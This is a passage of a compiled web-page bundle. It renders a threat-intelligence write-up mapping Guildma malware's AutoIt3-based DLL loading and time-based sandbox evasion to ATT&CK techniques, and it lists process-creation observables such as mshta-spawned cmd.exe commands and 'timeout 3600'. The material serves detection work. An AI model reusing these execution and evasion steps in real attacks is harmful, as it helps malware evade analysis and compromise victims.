",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe"  C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log'))))),(0,l.kt)("h4",{id:"notes-7"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The binary of ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," is executed to load the ",(0,l.kt)("em",{parentName:"li"},"AutoIt3")," script, which is responsible for loading the Guildma DLL afterwards")),(0,l.kt)("h3",{id:"threat-actor-used-autoit3-scripts-to-launch-guildma-dll-for-execution"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"AutoIt3")," scripts to launch ",(0,l.kt)("em",{parentName:"h3"},"Guildma DLL")," for Execution."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059 - Command and Scripting Interpreter"),(0,l.kt)("li",{parentName:"ul"},"T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059"),(0,l.kt)("td",{parentName:"tr",align:null},"Dllhost.exe is launched by the ",(0,l.kt)("em",{parentName:"td"},"AutoIt3")," interpreter."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Windows\\System32\\dllhost.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1497.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Timeout.exe is launched by CMD.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"timeout  3600"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe is spawned by mshta.exe to create another file in C:","\\","Users","\\","Public","\\","Videos file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\System32\\cmd.exe" /V /C "echo gharobhnpuluguaoqzgezkk >C:\\Users\\Public\\Videos\\VEO46570203888O\\\\r1.log"&& exit'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"CMD.exe creates a file called r1.log"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\r1.log"))))),(0,l.kt)("h4",{id:"notes-8"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Maybe the content of the DLL is loaded in memory under this process."),(0,l.kt)("li",{parentName:"ul"},"Timeout binary pauses the command processor for the specified number of seconds."),(0,l.kt)("li",{parentName:"ul"},"3600 seconds is 60 minutes"),(0,l.kt)("li",{parentName:"ul"},"The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'"),(0,l.kt)("li",{parentName:"ul"},"The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'")))}c.isMDXComponent=!0}}]);